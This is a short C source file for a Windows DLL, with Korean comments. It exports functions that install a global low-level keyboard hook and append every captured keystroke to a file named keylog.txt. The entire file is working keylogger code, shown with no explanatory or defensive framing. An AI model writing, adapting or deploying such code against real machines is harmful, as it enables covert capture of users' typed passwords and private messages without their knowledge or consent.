#include <Windows.h>
#include <stdio.h>

HHOOK hHook = NULL;
FILE *file;

// 키보드 후킹 콜백 함수
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT *p = (KBDLLHOOKSTRUCT *)lParam;
        if (file) {
            fprintf(file, "%c", p->vkCode);  // 키 입력 저장
            fflush(file);
        }
    }
    return CallNextHookEx(hHook, nCode, wParam, lParam);
}

// 후킹 시작 함수
__declspec(dllexport) void HookStart() {
    file = fopen("keylog.txt", "a+");  // 로그 파일 열기
    if (file == NULL) {
        MessageBox(NULL, L"Failed to open log file.", L"Error", MB_ICONERROR);
        return;
    }
    hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    if (!hHook) {
        MessageBox(NULL, L"Failed to set hook.", L"Error", MB_ICONERROR);
        fclose(file);
    }
}

// 후킹 중지 함수
__declspec(dllexport) void HookStop() {
    if (hHook) {
        UnhookWindowsHookEx(hHook);
        hHook = NULL;
    }
    if (file) {
        fclose(file);
        file = NULL;
    }
}